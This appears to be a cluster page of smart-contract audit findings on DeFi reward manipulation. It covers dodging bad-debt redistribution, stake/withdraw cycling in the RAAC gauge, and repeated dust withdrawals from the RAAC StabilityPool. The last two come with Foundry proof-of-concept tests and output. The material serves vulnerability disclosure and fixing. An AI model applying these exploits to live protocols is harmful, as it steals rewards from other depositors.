# Cluster -1045

**Rank:** #298  
**Count:** 24  

## Label
Attackers exploit timing and price arbitrage to manipulate reward distributions, capturing disproportionate yields through front-running, flashloan sandwiches, or short-duration deposits—undermining fairness, equity, and time-weighted incentive alignment.

## Cluster Information
- **Total Findings:** 24

## Examples

### Example 1

**Auto Label:** Attackers exploit timing gaps and state transitions in trove lifecycle operations to manipulate reward distribution, avoid fees, or shift debt burdens—enabling reward theft, unfair allocation, or profit from bad debt without collateral.  

**Original Text Preview:**

## Severity

**Impact:** High

**Likelihood:** Low

## Description

When a liquidation occurs and the stability pool does not have enough funds to absorb the bad debt, this debt is distributed among all active troves.

Before a big liquidation that will cause a redistribution of bad debt, trove owners can withdraw their collateral just before the liquidation happens and open the trove again just after the liquidation, thus avoiding the redistribution of bad debt and increasing the bad debt of other troves.

## Recommendations

Implement a two-step mechanism for closing troves such that the request and the execution of the closing are separated by a time delay.

---
### Example 2

**Auto Label:** Reward manipulation through timing, weight control, or imbalance exploitation enables attackers to unfairly inflate reward eligibility or extract disproportionate benefits via unauthorized or short-term actions.  

**Original Text Preview:**

## Summary

The RAAC Gauge system implements a reward distribution mechanism where users can stake tokens and earn rewards based on their stake amount and `veToken` balance (includes a boost multiplier feature that affects reward calculations). Users staking and withdrawing repeatedly a large amount of tokens can game the system and maximize the rewards.

## Vulnerability Details

The current implementation allows users to manipulate their reward earnings by:

* temporarily staking large amounts of tokens
* claiming or accruing rewards based on the inflated stake
* quickly withdrawing the staked tokens
* repeating this process to maximize rewards

The system lacks of implementation of time-weighted average balances and of a minimum staking period or withdrawal penalties. So it is subsceptible to short-term staking manipulation. Users staking and withdrawing repeatedly a large amount of tokens can game the system and maximize the rewards.

```Solidity
function stake(uint256 amount) external nonReentrant updateReward(msg.sender) {
        if (amount == 0) revert InvalidAmount();
        _totalSupply += amount;
@>      _balances[msg.sender] += amount;
        stakingToken.safeTransferFrom(msg.sender, address(this), amount);
        emit Staked(msg.sender, amount);
    }

    function withdraw(uint256 amount) external nonReentrant updateReward(msg.sender) {
        if (amount == 0) revert InvalidAmount();
        if (_balances[msg.sender] < amount) revert InsufficientBalance();
        _totalSupply -= amount;
@>      _balances[msg.sender] -= amount;
        stakingToken.safeTransfer(msg.sender, amount);
        emit Withdrawn(msg.sender, amount);
    }
```

## Impact

Add Foundry to the project following this [procedure](https://hardhat.org/hardhat-runner/docs/advanced/hardhat-and-foundry)

Create a file named RaacGauge.t.sol and copy/paste this:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {RAACGauge} from "../contracts/core/governance/gauges/RAACGauge.sol";
import {GaugeController} from "../contracts/core/governance/gauges/GaugeController.sol";
import {IGaugeController} from "../contracts/interfaces/core/governance/gauges/IGaugeController.sol";
import {IGauge} from "../contracts/interfaces/core/governance/gauges/IGauge.sol";
import {MockToken} from "../contracts/mocks/core/tokens/MockToken.sol";

contract RaacGaugeTest is Test {
    MockToken public rewardToken;
    MockToken public veRAACToken;
    GaugeController public gaugeController;
    RAACGauge public raacGauge;

    bytes32 public constant CONTROLLER_ROLE = keccak256("CONTROLLER_ROLE");
    bytes32 public constant EMERGENCY_ADMIN = keccak256("EMERGENCY_ADMIN");
    bytes32 public constant FEE_ADMIN = keccak256("FEE_ADMIN");

    address owner = makeAddr("owner");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    uint256 public WEEK = 7 * 24 * 3600;
    uint256 public WEIGHT_PRECISION = 10000;

    function setUp() public {
        rewardToken = new MockToken("Reward Token", "RWD", 18);
        veRAACToken = new MockToken("veRAAC Token", "veRAAC", 18);

        // Setup initial state
        veRAACToken.mint(alice, 200 ether);
        veRAACToken.mint(bob, 1000 ether);
        rewardToken.mint(alice, 1000 ether);
        rewardToken.mint(bob, 1000 ether);

        gaugeController = new GaugeController(address(veRAACToken));

        vm.warp(block.timestamp + 3 weeks);

        raacGauge = new RAACGauge(address(rewardToken), address(veRAACToken), address(gaugeController));

        // Setup roles
        raacGauge.grantRole(raacGauge.CONTROLLER_ROLE(), owner);

        vm.startPrank(alice);
        rewardToken.approve(address(raacGauge), type(uint256).max);
        veRAACToken.approve(address(raacGauge), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(bob);
        rewardToken.approve(address(raacGauge), type(uint256).max);
        veRAACToken.approve(address(raacGauge), type(uint256).max);
        vm.stopPrank();

        // Add gauge to controller
        gaugeController.grantRole(gaugeController.GAUGE_ADMIN(), owner);
        gaugeController.addGauge(address(raacGauge), IGaugeController.GaugeType.RAAC, WEIGHT_PRECISION);

        // Move time forward
        vm.warp(block.timestamp + 1 weeks);

        // Set initial gauge weight through voting
        vm.prank(alice);
        gaugeController.vote(address(raacGauge), WEIGHT_PRECISION);

        // Set emission rate
        vm.prank(owner);
        raacGauge.setWeeklyEmission(10000 ether);

        // Transfer reward tokens to gauge for distribution
        rewardToken.mint(address(raacGauge), 100000 ether);

        vm.prank(owner);
        raacGauge.setBoostParameters(25000, 10000, WEEK);

        // Set initial weight after time alignment
        vm.prank(address(gaugeController));
        raacGauge.setInitialWeight(5000); // 50% weight

        vm.warp(block.timestamp + 1);

        console2.log("\nContracts:");
        console2.log("rewardToken:  ", address(rewardToken));
        console2.log("veRAACToken: ", address(veRAACToken));
        console2.log("raacGauge: ", address(raacGauge));
        console2.log("");
    }

    function test_stakeWithdrawGaming() public {
        veRAACToken.mint(alice, 800 ether); //same initial balance as bob

        // Move to start of next period for clean test
        uint256 nextPeriod = ((block.timestamp / WEEK) + 1) * WEEK;
        vm.warp(nextPeriod);

        vm.prank(alice);
        raacGauge.stake(900 ether);

        vm.prank(bob);
        raacGauge.stake(900 ether);

        uint256 aliceBalanceAfter = veRAACToken.balanceOf(alice);
        uint256 bobBalanceAfter = veRAACToken.balanceOf(bob);
        assertEq(aliceBalanceAfter, 100 ether); //same voting power
        assertEq(bobBalanceAfter, 100 ether); //same voting power

        vm.prank(address(gaugeController));
        raacGauge.notifyRewardAmount(1000 ether);
        vm.prank(alice);
        raacGauge.voteEmissionDirection(5000);

        vm.warp(block.timestamp + 1 weeks / 2);

        // Record initial rewards state
        uint256 aliceInitialEarned = raacGauge.earned(alice);
        uint256 bobInitialEarned = raacGauge.earned(bob);

        console2.log("Alice earned (initial):", aliceInitialEarned);
        console2.log("Bob earned (initial):", bobInitialEarned);

        // Bob games the system through multiple stake/withdraws
        for (uint256 i = 0; i < 10; i++) {
            vm.prank(bob);
            raacGauge.withdraw(900 ether);
            vm.warp(block.timestamp + 1 hours);

            vm.prank(bob);
            raacGauge.stake(900 ether);
            vm.warp(block.timestamp + 1 hours);
        }

        vm.warp(block.timestamp + 1 days);

        // Calculate actual rewards earned during the gaming period
        uint256 aliceEarned = raacGauge.earned(alice) - aliceInitialEarned;
        uint256 bobEarned = raacGauge.earned(bob) - bobInitialEarned;

        console2.log("\nResults after gaming attempts:");
        console2.log("Alice earned (stable holder):", aliceEarned);
        console2.log("Bob earned (stake/withdraw cycling):", bobEarned);
        console2.log("Bob/Alice earnings ratio:", (aliceEarned * 100) / bobEarned, "%");

        console2.log("----------------");
    }
}
```

Run forge test --match-test test\_stakeWithdrawGaming -vv

```solidity
Logs:
  
Contracts:
  rewardToken:   0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  veRAACToken:  0x2e234DAe75C793f67A35089C9d99245E1C58470b
  raacGauge:  0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
  
  Alice earned (initial): 597222
  Bob earned (initial): 597222
  
Results after gaming attempts:
  Alice earned (stable holder): 383928
  Bob earned (stake/withdraw cycling): 473205
  Bob/Alice earnings ratio: 81 %
  ----------------

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.03ms (2.16ms CPU time)
```

The test shows that bob staking and withdrawing repeatedly earns 81% of rewards more than Alice.

## Tools Used

Manual review.

## Recommendations

Implement a mechanism to prevent the gaming condition like minimum staking period or withdrawal penalties.

---
### Example 3

**Auto Label:** Reward manipulation through timing, weight control, or imbalance exploitation enables attackers to unfairly inflate reward eligibility or extract disproportionate benefits via unauthorized or short-term actions.  

**Original Text Preview:**

## Summary

When a user withdraws deposited RToken from StabilityPool, the pool transfers corresponding RAACToken rewards to the user. The reward amount is calculated currently deposited RToken *pro rata*. This means if an attacker withdraws 1 wei from StabilityPool multiple times, they can get nearly the same reward share for all the withdrawals. This way, the attacker gain major portion of RAACToken rewards, and ultimately will gain significant voting power and can disrupt the protocol.

## Vulnerability Details

**Root Cause Analysis**

Users can deposit RToken into StabilityPool to receive RAACToken rewards.

RAACToken is minted from RAACMinter on certain emission rate and transferred to StabilityPool.

Users can claim RAACTokens when they withdraw deposited RToken from StabilityPool.

The vulnerability lies in the fact that how RToken reward amount is calculated:

```Solidity
    function calculateRaacRewards(address user) public view returns (uint256) {
        uint256 userDeposit = userDeposits[user];
        uint256 totalDeposits = deToken.totalSupply();

        uint256 totalRewards = raacToken.balanceOf(address(this));
        if (totalDeposits < 1e6) return 0;

@>      return (totalRewards * userDeposit) / totalDeposits;
    }
```

In other words, the user receives `totalRewards * userDeposit / totalDeposits` when they withdraw from StabilityPool.

Consider the following scenario:

* StabilityPool currently has 1000 RAACToken, i.e. `totalRewards = 1000`
* User has 100 RToken deposits, i.e. `userDeposit = 100`
* `DEToken`has 1000 total supply i.e. `totalDeposits = 1000`
* User withdraws `1 wei` from StabilityPool

  * User's raac rewards would be `100 - (1e-18) / 1000 * 1000 = 100 - (1e-18)`
  * User receives nearly 100 RAACToken
  * StabilityPool now has 900 RAACToken
* User withdraws another `1 wei`from StabiltyPool

  * User's raac rewards would be `100 - (2e-18) / 900 * (1000 - 1e-18) = 90 `     &#x20;
  * User receives nearly 90 RAACToken
  * StabiltyPool now has 810 RAACToken
* User can repeats dust withdrawal process as many times as they want, and they will always receive around 1/10 of total rewards.
* After repeating above process for enough times, user can siphon most of the rewards the StabilityPool holds

### POC

**Scenario**

* Alice has 10000 RToken and deposits 10000 RToken to StabilityPool
* Eve has 1000 RToken and deposits 1000 RToken to StabilityPool
* 7 days pass, and StabilityPool accrues some rewards
* Eve withdraws `1 wei` from StabilityPool for 100 times
* Alice withdraws 5000 RToken from StabiltyPool
* Eve has most of the RAAC rewards, Alice only receives dust amount of rewards

**How to run POC**

* Follow [hardhat foundry integration tutorial](https://hardhat.org/hardhat-runner/docs/advanced/hardhat-and-foundry#adding-foundry-to-a-hardhat-project)

- Create a file `test/poc.t.sol` with the following content and run `forge test poc.t.sol -vvv`

```solidity
pragma solidity ^0.8.19;

import "../lib/forge-std/src/Test.sol";
import {RToken} from "../contracts/core/tokens/RToken.sol";
import {DebtToken} from "../contracts/core/tokens/DebtToken.sol";
import {DEToken} from "../contracts/core/tokens/DEToken.sol";
import {RAACToken} from "../contracts/core/tokens/RAACToken.sol";
import {veRAACToken} from "../contracts/core/tokens/veRAACToken.sol";
import {RAACNFT} from "../contracts/core/tokens/RAACNFT.sol";
import {LendingPool} from "../contracts/core/pools/LendingPool/LendingPool.sol";
import {StabilityPool} from "../contracts/core/pools/StabilityPool/StabilityPool.sol";
import {RAACMinter} from "../contracts/core/minters/RAACMinter/RAACMinter.sol";
import {RAACHousePrices} from "../contracts/core/primitives/RAACHousePrices.sol";

import {crvUSDToken} from "../contracts/mocks/core/tokens/crvUSDToken.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract RAACTest is Test {
    RToken rToken;
    DebtToken debtToken;
    RAACToken raacToken;
    DEToken deToken;
    veRAACToken veToken;
    RAACNFT raacNft;
    RAACMinter raacMinter;
    crvUSDToken crvUsd;

    LendingPool lendingPool;
    StabilityPool stabilityPool;
    RAACHousePrices housePrice;

    address alice = makeAddr("alice");
    address eve = makeAddr("eve");
    uint256 userAssetAmount = 10_000e18;
    uint256 tokenId = 1;

    uint256 initialBurnTaxRate = 50;
    uint256 initialSwapTaxRate = 100;
    uint256 initialPrimeRate = 0.1e27;

    function setUp() external {
        vm.warp(1e9); // warp time stamp to avoid underflow in RAACMinter constructor
        crvUsd = new crvUSDToken(address(this));
        housePrice = new RAACHousePrices(address(this));
        debtToken = new DebtToken("DebtToken", "DTK", address(this));
        rToken = new RToken("RToken", "RTK", address(this), address(crvUsd));
        raacNft = new RAACNFT(address(crvUsd), address(housePrice), address(this));
        lendingPool = new LendingPool(
            address(crvUsd), address(rToken), address(debtToken), address(raacNft), address(housePrice), 0.1e27
        );
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
        deToken = new DEToken("DEToken", "DET", address(this), address(rToken));
        raacToken = new RAACToken(address(this), initialSwapTaxRate, initialBurnTaxRate);
        stabilityPool = new StabilityPool(address(this));
        stabilityPool.initialize(
            address(rToken), address(deToken), address(raacToken), address(this), address(crvUsd), address(lendingPool)
        );
        lendingPool.setStabilityPool(address(stabilityPool));
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(lendingPool), address(this));
        stabilityPool.setRAACMinter(address(raacMinter));
        raacToken.setMinter(address(raacMinter));
        veToken = new veRAACToken(address(raacToken));
        raacToken.manageWhitelist(address(veToken), true);
        deToken.setStabilityPool(address(stabilityPool));
    }

    function testRAACRewards() external {
        _mintRToken(alice, 10000e18);
        _mintDeToken(alice, 10000e18);
        _mintRToken(eve, 1000e18);
        _mintDeToken(eve, 1000e18);
        skip(7 days);
        vm.roll(7 * 7200);
        for (uint256 i; i < 100; i++) {
            _withdrawDeToken(eve, 1);
        }
        _withdrawDeToken(alice, 5000e18);
        emit log_named_decimal_uint("eve raac balance", raacToken.balanceOf(eve), 18);
        emit log_named_decimal_uint("alice raac balance", raacToken.balanceOf(alice), 18);
    }

    function _mintRToken(address account, uint256 amount) internal {
        crvUsd.mint(account, amount);
        vm.startPrank(account);
        crvUsd.approve(address(lendingPool), amount);
        lendingPool.deposit(amount);
        vm.stopPrank();
    }

    function _mintDeToken(address account, uint256 rTokenAmount) internal {
        vm.startPrank(account);
        rToken.approve(address(stabilityPool), rTokenAmount);
        stabilityPool.deposit(rTokenAmount);
        vm.stopPrank();
    }

    function _withdrawDeToken(address account, uint256 deTokenAmount) internal {
        vm.startPrank(account);
        deToken.approve(address(stabilityPool), deTokenAmount);
        stabilityPool.withdraw(deTokenAmount);
        vm.stopPrank();
    }
}

```

Console Output

```Solidity
[PASS] testRAACRewards() (gas: 4662175)
Logs:
eve raac balance: 6894.362863760696760103
alice raac balance: 0.454846076134218376
```

## Impact

* Attackers can steal RAAC rewards from other users
* Attackers can gain significant voting power and can inflict damage to the protocol with voting system

## Tools Used

Manual Review, Foundry

## Recommendations

* RAAC rewards should be calculated like the following:

```Solidity

totalRewards * withdrawnAmount / totalDeposits
```

* Already claimed rewards should be deducted from reward amount

---
